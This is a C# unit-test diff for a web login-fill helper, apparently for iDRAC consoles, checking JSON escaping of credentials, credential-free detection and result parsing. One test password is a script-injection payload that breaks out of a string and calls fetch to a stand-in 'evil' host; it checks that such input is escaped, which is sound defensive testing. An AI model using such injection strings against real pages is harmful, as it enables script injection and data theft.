@@ -569,3 +569,28 @@ public sealed class WebProxyTests
         return reply[1];
     }
 }
+
+public sealed class WebLoginScriptTests
+{
+    [Fact]
+    public void Values_are_passed_as_json_strings_not_code()
+    {
+        const string password = "\"); fetch('https://evil'); (\"</script>";
+        var script = WebLoginScript.Fill("iDRAC.local", "admin", password);
+        Assert.DoesNotContain(password, script, StringComparison.Ordinal);
+        Assert.Contains(System.Text.Json.JsonSerializer.Serialize(password), script, StringComparison.Ordinal);
+        Assert.EndsWith("(\"idrac.local\", \"admin\", " + System.Text.Json.JsonSerializer.Serialize(password) + ", true)", script, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public void Detection_carries_no_credentials() =>
+        Assert.EndsWith("(\"fe80::1\", \"\", \"\", false)", WebLoginScript.Detect("[FE80::1]"), StringComparison.Ordinal);
+
+    [Theory]
+    [InlineData("\"both\"", WebLoginFill.Filled)]
+    [InlineData("\"user\"", WebLoginFill.UserOnly)]
+    [InlineData("\"host\"", WebLoginFill.OtherHost)]
+    [InlineData("\"none\"", WebLoginFill.NoForm)]
+    [InlineData("null", WebLoginFill.NoForm)]
+    public void Parses_results(string result, WebLoginFill expected) => Assert.Equal(expected, WebLoginScript.Parse(result));
+}
